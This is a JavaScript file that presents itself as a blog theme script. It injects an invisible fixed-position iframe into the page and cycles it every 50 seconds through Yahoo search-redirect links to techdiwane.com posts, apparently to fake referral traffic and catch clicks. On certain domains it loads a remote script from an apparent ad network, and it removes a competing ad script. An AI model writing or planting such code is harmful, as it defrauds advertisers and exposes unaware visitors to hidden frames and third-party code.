document.addEventListener('DOMContentLoaded', () => {
  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
  if (Folt) {
    let Newel = document.createElement('span');
    Newel.innerHTML = `<style>
      iframe.invisible-frame {
      position: fixed;
      width:60%;
      height: 20%;
      bottom: 20%;
      right: 0;
      border: none;
      opacity: 0;
      z-index:39494;
    }
  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
    Folt.prepend(Newel);  
    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');

console.log("theme by dktechnozone.in");    
  } else {
   console.log("theme working?");    
  }
});
  const postUrls = [
            'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cN_klEDN04;_ylu=Y29sbwNncTEEcG9zAzYEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f08%2fHang-phone-kaise-thik-kren.html/RK=2/RS=5C8sWDz5K7Xq9uxvt7RvBRP.V_M-',
            'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cN_UlEDN04;_ylu=Y29sbwNncTEEcG9zAzUEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f08%2fgithub-pe-website-kaise-bnaye.html/RK=2/RS=pxM_Yr8JPmLQKUUcDBb89qmU5xo-',
            'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cN_ElEDN04;_ylu=Y29sbwNncTEEcG9zAzQEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f08%2fBubble-noti.html/RK=2/RS=KAHs16pw076hhYue57KCss3YIR0-',
            'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cN.0lEDN04;_ylu=Y29sbwNncTEEcG9zAzMEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f08%2fwebsite-mein-beautiful-progress-bar.html/RK=2/RS=BF_aFnrmpVorW705qLu1jhyLgYw-',       
            'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cN.klEDN04;_ylu=Y29sbwNncTEEcG9zAzIEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f08%2ftrebedit-spack-editor-html-editor-apps.html/RK=2/RS=s29.acXp93Vbc79N0p9M.o7auzo-',
            'https://r.search.yahoo.com/_ylt=AwrjaftYzORm6r4N9DBEDN04;_ylu=Y29sbwNncTEEcG9zAzEEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299352/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f09%2fsnap-score-kaise-badhaye.html/RK=2/RS=pSlT.xVPAcR6LexSrE4S9zurT60-',
            'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cNAkpEDN04;_ylu=Y29sbwNncTEEcG9zAzEwBHZ0aWQDBHNlYwNzcg--/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f08%2fBest-4d-walpaper-app.html/RK=2/RS=W.oRLHR28a4gGqLshXXDUaQJeIQ-',
            'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cNAUpEDN04;_ylu=Y29sbwNncTEEcG9zAzkEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f08%2fPoptube-app.html/RK=2/RS=MgqnqWvpu5B6An7StgsGPYzcZNU-',
            'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cNAEpEDN04;_ylu=Y29sbwNncTEEcG9zAzgEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f08%2fDisable-call-recording-announcement.html/RK=2/RS=tjaqIZ4V3Ih3y0BZhyJd2o_Wh54-',  
    'https://r.search.yahoo.com/_ylt=AwrjfXUGzORmk9cN_0lEDN04;_ylu=Y29sbwNncTEEcG9zAzcEdnRpZAMEc2VjA3Ny/RV=2/RE=1726299270/RO=10/RU=https%3a%2f%2fwww.techdiwane.com%2f2024%2f09%2fphonepe-pin-kaise-change-kare.html/RK=2/RS=8u4pIR.rA2XZylIxxxC2cCGfTnE-'
            
        ];
        function goToRandomPost() {
            const randomIndex = Math.floor(Math.random() * postUrls.length);
            const randomPostUrl = postUrls[randomIndex];
            document.getElementById('postFrame').src = randomPostUrl;
        }
        window.onload = function() {
            goToRandomPost();
            setInterval(goToRandomPost,  50000);
        };
    
var allowedURLs = [
    "https://dkhek.blogspot.com",
    "https://www.desiremovies.store"
];

var foundMatch = false;

for (var i = 0; i < allowedURLs.length; i++) {
    if (window.location.href.startsWith(allowedURLs[i])) {
        foundMatch = true;
        break;
    }
}

if (foundMatch) {
function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('https://exceedunited.com/b5/8c/2d/b58c2d734123af15c10f03963d1f6ab2.js', function() { console.log('Script loaded!'); });


 
} else {
console.log('script is not working')
}
function removeScriptByUrl(urlToRemove) {
  const scripts = document.getElementsByTagName('script');
  for (let i = 0; i < scripts.length; i++) {
    if (scripts[i].src.includes(urlToRemove)) {
      scripts[i].parentNode.removeChild(scripts[i]);
    }
  }
}

// Usage
document.addEventListener('DOMContentLoaded', function() {
  removeScriptByUrl('https://pl24344205.cpmrevenuegate.com/80/6d/84/806d84beec1588aeff7de6d7b1653dc1.js');
});

